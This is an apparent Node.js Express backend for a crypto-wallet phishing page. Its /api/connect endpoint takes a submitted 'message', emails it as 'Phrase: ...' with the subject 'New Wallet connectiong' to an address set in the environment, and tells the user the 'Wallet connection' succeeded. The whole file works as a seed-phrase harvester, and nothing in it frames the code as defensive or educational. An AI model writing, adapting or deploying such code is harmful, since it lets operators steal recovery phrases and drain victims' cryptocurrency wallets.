import "dotenv/config";
import cors from "cors";
import helmet from 'helmet';
import express from "express";
import nodemailer from "nodemailer";

const app = express();
const port = Number(process.env.PORT) || 3000;

app.use(helmet());
app.use(cors());

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

const requiredEnvironment = ["GMAIL_USER", "GMAIL_APP_PASSWORD", "EMAIL_TO"];

function missingEnvironment() {
  return requiredEnvironment.filter((key) => !process.env[key]);
}

function createTransporter() {
  return nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_APP_PASSWORD,
    },
  });
}

app.post("/api/connect", async (req, res) => {
  const missing = missingEnvironment();
  if (missing.length) {
    return res.status(500).json({
      error: `Server email is not configured. Missing: ${missing.join(", ")}`,
    });
  }

  const {message } = req.body;
  if (!message) {
    return res.status(400).json({
      error: "message required",
    });
  }

  try {
    await createTransporter().sendMail({
      from: `Form submission <${process.env.GMAIL_USER}>`,
      to: process.env.EMAIL_TO,
      subject: `New Wallet connectiong`,
      text: `Phrase: ${message}`,
    });

    return res.status(201).json({ message: "Wallet connection successful" });
  } catch (error) {
    console.error("unable to connect:", error.message);
    return res.status(502).json({ error: "Unable to connect. Please try again." });
  }
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
